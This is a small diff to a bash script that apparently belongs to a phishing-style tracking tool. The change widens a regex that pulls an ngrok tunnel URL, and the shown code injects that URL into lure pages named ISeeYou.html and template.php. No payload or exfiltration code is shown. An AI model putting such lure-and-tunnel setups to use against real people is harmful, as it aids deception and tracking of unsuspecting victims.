@@ -122,7 +122,7 @@ printf '\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;93m %s\n' $s
 
 payload_ngrok() {
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-zA-Z-]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' ISeeYou.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
@@ -172,7 +172,7 @@ printf "\e[1;93m[\e[0m+\e[1;93m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-zA-Z-]*\.ngrok.io")
 printf "\e[1;93m[\e[0m*\e[1;93m] Direct link:\e[0m\e[1;93m %s\e[0m\n" $link
 
 payload_ngrok
